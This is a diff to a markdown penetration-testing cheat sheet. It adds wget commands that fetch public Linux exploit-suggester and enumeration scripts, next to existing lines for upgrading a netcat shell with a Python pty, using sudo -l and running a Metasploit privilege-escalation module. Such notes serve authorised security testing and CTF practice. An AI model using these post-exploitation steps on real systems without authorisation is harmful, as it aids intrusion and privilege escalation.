@@ -35,6 +35,8 @@
 * `sudo -l` _Show commands that can be run as sudo_
 * `python -c 'import pty:pty.spawn("/bin/bash")'` _Get a better shell in netcat_
 * `CTRZ + z -- stty raw -echo  -- fg` _Make netcat python shell interactive.  You won't see fg when it's typed.  Just hit enter._
+* `wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl` _Download exploit suggester_
+* `wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh` _Download linux enumeration script_
 
 ## Pric Esc Generic
 * `run post/multi/recon/local_exploit_suggester` _Check for local priv esc exploits.  Must be interacting with meterpreter session_
